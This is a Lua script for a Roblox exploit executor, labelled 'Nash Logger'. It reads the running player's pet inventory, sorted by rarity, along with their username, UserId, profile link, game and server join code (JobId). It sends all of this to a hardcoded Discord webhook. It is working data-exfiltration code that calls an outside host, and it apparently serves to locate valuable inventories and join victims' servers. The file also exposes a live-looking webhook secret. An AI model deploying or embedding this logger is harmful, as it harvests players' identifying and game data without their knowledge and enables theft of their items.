local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalPlayer = Players.LocalPlayer

local webhookURL = "https://discord.com/api/webhooks/1389953544009814106/83Lx-nyCheX0oe9e-4e_cIJF_TU4JPxMGiYSxomG8RoGCa6S_bJeQOfFzS8CzwnI-nXg"

local gameName = "Unknown"

-- 品質分類表
local PetQuality = {
    Common = {"Starfish", "Crab", "Seagull", "Bunny", "Dog", "Golden Lab"},
    Uncommon = {"Bee", "Shiba Inu", "Black Bunny", "Cat", "Chicken", "Deer"},
    Rare = {
        "Flamingo", "Toucan", "Sea Turtle", "Orangutan", "Seal", "Honey Bee", "Wasp",
        "Nihonzaru", "Kiwi", "Hedgehog", "Monkey", "Orange Tabby", "Pig", "Rooster", "Spotted Deer"
    },
    Legendary = {
        "Grey Mouse", "Tarantula Hawk", "Caterpillar", "Snail", "Petal Bee", "Moth",
        "Scarlet Macaw", "Ostrich", "Peacock", "Capybara", "Tanuki", "Tanchozuru",
        "Cow", "Polar Bear", "Sea Otter", "Silver Monkey", "Panda", "Blood Hedgehog",
        "Frog", "Mole", "Moon Cat", "Bald Eagle", "Turtle", "Sand Snake", "Meerkat",
        "Parasaurolophus", "Iguanodon", "Pachycephalosaurus", "Raptor", "Triceratops", "Stegosaurus"
    },
    Mythical = {
        "Brown Mouse", "Giant Ant", "Praying Mantis", "Red Giant Ant", "Squirrel",
        "Bear Bee", "Butterfly", "Pack Bee", "Mimic Octopus", "Kappa", "Hamster",
        "Chicken Zombie", "Firefly", "Owl", "Golden Bee", "Echo Frog", "Cooked Owl",
        "Blood Kiwi", "Night Owl", "Hyacinth Macaw", "Axolotl", "Dilophosaurus",
        "Ankylosaurus", "Pterodactyl", "Brontosaurus", "Koi"
    },
    Divine = {
        "Red Fox", "Dragonfly", "Disco Bee", "Blood Owl", "Raccoon", "Fennec Fox",
        "Spinosaurus", "T-Rex", "Queen Bee"
    },
    Prismatic = {
        "Kitsune"
    }
}

-- 反查表：寵物名稱 -> 品質
local NameToQuality = {}
for quality, petList in pairs(PetQuality) do
    for _, petName in ipairs(petList) do
        NameToQuality[petName] = quality
    end
end

-- 嘗試取得遊戲名稱
pcall(function()
    local info = MarketplaceService:GetProductInfo(game.PlaceId)
    gameName = info.Name or "Unknown"
end)

-- Roblox 玩家個人頁面網址
local profileUrl = "https://www.roblox.com/users/" .. tostring(LocalPlayer.UserId) .. "/profile"

-- 初始化分類儲存表
local petsByQuality = {
    Common = {},
    Uncommon = {},
    Rare = {},
    Legendary = {},
    Mythical = {},
    Divine = {},
    Prismatic = {}
}

-- 遍歷背包物品，只要包含指定寵物名稱就歸類
for _, item in ipairs(LocalPlayer:WaitForChild("Backpack"):GetChildren()) do
    if item:IsA("Tool") then
        local itemName = item.Name

        -- 找出符合的寵物名稱
        for petName, quality in pairs(NameToQuality) do
            if itemName:lower():find(petName:lower(), 1, true) then
                table.insert(petsByQuality[quality], itemName)
                break -- 一個物品只歸入一種品質分類
            end
        end
    end
end

-- 建立 Discord fields 欄位
local fields = {}
for _, quality in ipairs({"Common", "Uncommon", "Rare", "Legendary", "Mythical", "Divine", "Prismatic"}) do
    local pets = petsByQuality[quality]
    if #pets > 0 then
        table.insert(fields, {
            name = quality .. " Pets",
            value = table.concat(pets, "\n"):sub(1, 1024),
            inline = false
        })
    end
end

-- Embed 組裝
local embed = {
    ["title"] = "腳本執行",
    ["description"] = "**真實名稱:** " .. LocalPlayer.Name ..
                      "\n**顯示名稱:** " .. LocalPlayer.DisplayName ..
                      "\n**玩家ID:** " .. LocalPlayer.UserId ..
                      "\n**個人資料:** [Roblox 個人頁面](" .. profileUrl .. ")" ..
                      "\n**遊戲:** " .. gameName ..
                      "\n**玩家伺服器人數:** " .. #Players:GetPlayers() ..
                      "\n**加入代碼:** " .. game.JobId,
    ["fields"] = fields,
    ["color"] = tonumber("0x3498db"),
    ["footer"] = {
        ["text"] = "Nash Logger"
    },
    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
}

local data = {
    ["username"] = "Script Logger",
    ["embeds"] = {embed}
}

-- 發送至 Discord Webhook
pcall(function()
    local jsonData = HttpService:JSONEncode(data)
    local requestFunc = request or http_request or syn and syn.request or http and http.request
    if requestFunc then
        requestFunc({
            Url = webhookURL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = jsonData
        })
    else
        warn("Your executor does not support HTTP requests.")
    end
end)
